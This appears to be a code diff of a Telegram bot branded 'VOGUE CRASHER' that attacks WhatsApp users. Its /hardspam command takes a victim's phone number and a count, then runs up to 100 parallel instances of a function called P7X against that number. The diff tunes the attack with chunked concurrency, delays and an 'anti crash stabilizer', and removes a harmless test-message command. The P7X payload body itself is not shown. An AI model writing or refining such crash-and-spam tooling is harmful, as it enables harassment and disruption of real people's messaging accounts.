@@ -3363,15 +3363,12 @@ bot.command('zzz', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAcc
     
     let q = args[1];
     
-    let executionCount =
-        parseInt(args[2]) || 1;
+    let executionCount = parseInt(args[2]) || 1;
     
-    if (executionCount > 100) {
-        executionCount = 100;
-    }
+    if (executionCount > 100) executionCount = 100;
     
     if (!q) return ctx.reply(
-        `Invalid Format
+`Invalid Format
 
 Usage:
 /hardspam <target_number> <amount>
@@ -3380,17 +3377,12 @@ Example:
 /hardspam 628xxxxxxxx 50`
     );
     
-    let target =
-        q.replace(/[^0-9]/g, "") +
-        "@s.whatsapp.net";
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     
     try {
         
-        const sent =
-            await ctx.replyWithPhoto(
-                thumbnailUrl,
-                {
-                    caption: `
+        await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
 \`\`\`ruby
 V O G U E  •  C R A S H E R
 ──────────────────────────
@@ -3404,24 +3396,18 @@ Status      : Active
 ──────────────────────────
 Dispatch engine initialized.
 \`\`\``,
-                    parse_mode: "markdown",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                            {
-                                text: "Check Target",
-                                url: `https://wa.me/${q}`,
-                                style: "primary"
-                            }]
-                        ]
-                    }
-                }
-            );
+            parse_mode: "markdown",
+            reply_markup: {
+                inline_keyboard: [[{
+                    text: "Check Target",
+                    url: `https://wa.me/${q}`
+                }]]
+            }
+        });
         
         (async () => {
             
             const instanceBase = Date.now();
-            
             const totalInstances = executionCount;
             
             const createInstance = async (instanceIndex) => {
@@ -3434,64 +3420,58 @@ Dispatch engine initialized.
                         
                         try {
                             
-                            if (!sock) {
-                                throw new Error("Socket unavailable");
+                            if (!sock || !sock.user) {
+                                throw new Error("Socket not ready");
                             }
                             
                             await P7X(sock, target);
-                            await sleep(3000)
                             
-                            console.log(
-                                `[INSTANCE ${instanceId}] Exec ${i + 1}`
-                            );
+                            await new Promise(res => setTimeout(res, 3500));
+                            
+                            if (sock.ws?.readyState !== 1) {
+                                throw new Error("WS not open");
+                            }
+                            
+                            console.log(`[INSTANCE ${instanceId}] Exec ${i + 1}`);
                             
                         } catch (e) {
+                            console.log(`[INSTANCE ${instanceId}] Error: ${e.message}`);
                             
-                            console.log(
-                                `[INSTANCE ${instanceId}] Error: ${e.message}`
-                            );
-                            
-                            
+                            // anti crash stabilizer
+                            await new Promise(res => setTimeout(res, 2000));
                         }
                     }
                     
-                    console.log(
-                        `[INSTANCE ${instanceId}] DONE`
-                    );
+                    console.log(`[INSTANCE ${instanceId}] DONE`);
                     
                 } catch (err) {
-                    
-                    console.log(
-                        `[INSTANCE ${instanceId}] FAILED: ${err.message}`
-                    );
+                    console.log(`[INSTANCE ${instanceId}] FAILED: ${err.message}`);
                 }
             };
             
-            // 🔥 BANGUN SEMUA INSTANCE SEKALIGUS
-            const allInstances = Array.from({ length: totalInstances },
-                (_, i) => createInstance(i + 1)
-            );
+            // LIMIT PARALLEL EXECUTION (INI YANG PENTING)
+            const chunkSize = 5;
             
-            await Promise.allSettled(allInstances);
+            for (let i = 0; i < totalInstances; i += chunkSize) {
+                
+                const chunk = Array.from(
+                    { length: Math.min(chunkSize, totalInstances - i) },
+                    (_, j) => createInstance(i + j + 1)
+                );
+                
+                await Promise.allSettled(chunk);
+                
+                await new Promise(res => setTimeout(res, 4000));
+            }
             
-            console.log(
-                `[SYSTEM] All ${totalInstances} instances completed`
-            );
+            console.log(`[SYSTEM] All ${totalInstances} instances completed`);
             
         })();
         
     } catch (error) {
         
-        ctx.reply(
-            `Operation Failed
-
-The system was unable to execute the requested module.
-Please verify the target input and system status before retrying.`
-        );
-        
-        console.log(
-            `[VOGUE CRASHER] Execution failed for ${q}`
-        );
+        ctx.reply(`Operation Failed\n\nSystem unable to execute module.`);
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
     }
 });
 
@@ -4606,30 +4586,5 @@ async function P7X(sock, target) {
 //     \____/\_| \_\_| |_/\____/\_| |_/\____/\_| \_|
 //                                                  
 //
-
-bot.command("testsend", async (ctx) => {
-    try {
-        const q = ctx.message.text.split(" ")[1];
-
-        if (!q) {
-            return ctx.reply("Usage: /testsend 628xxxxxxxx");
-        }
-
-        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-
-        await sock.sendMessage(target, {
-            text: `TEST MESSAGE
-
-From Bot System
-Status: Success
-Time: ${new Date().toLocaleString()}`
-        });
-
-        return ctx.reply(`Message sent to ${q}`);
-    } catch (err) {
-        console.log(err);
-        return ctx.reply("Failed to send message.");
-    }
-});
 
 bot.launch()
